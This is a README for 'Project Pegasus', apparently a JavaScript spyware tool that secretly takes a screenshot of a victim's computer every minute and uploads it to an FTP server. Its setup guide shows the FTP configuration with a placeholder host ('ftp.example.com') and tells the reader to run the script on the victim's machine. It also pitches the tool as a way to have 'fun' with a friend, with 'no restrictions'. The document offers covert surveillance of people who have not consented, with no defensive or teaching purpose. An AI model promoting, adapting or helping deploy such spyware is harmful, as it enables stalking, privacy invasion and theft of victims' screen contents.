# Project Pegasus

#### _JavaSctipt Spyware_ 
---
Pegasus is a lightweight spyware made from JavaScript. This script can take screenshots from victim's pc and upload them to the ftp server you provide in the script.

###### Made with these npm modules:
![npm version](https://img.shields.io/badge/fs-v0.0.1--security-gray?labelColor=blue) ![npm version](https://img.shields.io/badge/desktop--screenshot-blue) ![npm version](https://img.shields.io/badge/ftp-v0.3.10-gray?labelColor=blue)

---


## Setup Guide
1. Insert your ftp server details to the script.

    ```js
        48.  const ftpConfig = {
        49.      host: 'ftp.example.com',
        50.      port: 21, // Default FTP port is 21
        51.      user: 'username',
        52.      password: 'password'
        53.  };
    ```
2. In your ftp server root directory, create a new folder named `screenshots`.
This is the folder where victim's screenshots will upload.

3. Run the script on victim's computer.
   After running this on the victim's computer, a new folder will appear in the `screenshots` folder with the public ip address of the victim. In that folder you will see screenshots of the victim. Screenshots will upload every 1 minute.

##### Yes as you noticed, the victim can steal your ftp data. But the legends know what they need to do!

---

## This tool...

- If you want to give some fun to a friend, then you can use this tool.
- You can get anything from this code and make your own tool.
- No restrictions
- No copytight
- No lisence
- **Free Software, Hell Yeah!**
